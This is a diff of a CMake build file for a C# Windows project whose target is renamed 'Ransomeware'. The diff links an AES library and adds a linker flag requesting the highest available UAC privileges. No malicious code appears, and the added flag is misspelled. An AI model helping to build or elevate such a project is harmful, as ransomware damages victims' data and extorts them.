@@ -17,11 +17,11 @@ Properties/Resources.resx
 Properties/Settings.Designer.cs
 Properties/Settings.settings)
 
-set_property(TARGET ${PROJECT_NAME} PROPERTY WIN32_EXECUTABLE TRUE)
-
+set_property(TARGET Ransomeware PROPERTY WIN32_EXECUTABLE TRUE)
+set_TARGET_PROPERTIES(Ransomeware PROPERTIES LINK_FLAG  "/MAINFESTUAC:\" level='highestAvailable' uiAccess='false'\" /SUBSYSTEM:WINDOWS")
 # Set the C# language version (defaults to 3.0).
 
-set_property(TARGET ${PROJECT_NAME} PROPERTY 
+set_property(TARGET Ransomeware PROPERTY 
     VS_DOTNET_REFERENCE_AES "${CMAKE_BINARY_DIR}/AES/Debug/AES.dll")
 # Set the source file properties for Windows Forms use.
 message("${CMAKE_BINARY_DIR}/AES/Debug/AES.dll")
@@ -37,7 +37,7 @@ Properties/Settings.Designer.cs
 Properties/Settings.settings
 )
 # Add in the .NET reference libraries.
-set_property(TARGET ${PROJECT_NAME} PROPERTY VS_DOTNET_REFERENCES
+set_property(TARGET Ransomeware PROPERTY VS_DOTNET_REFERENCES
 " Microsoft.Win32"
  "System"
  "AES"
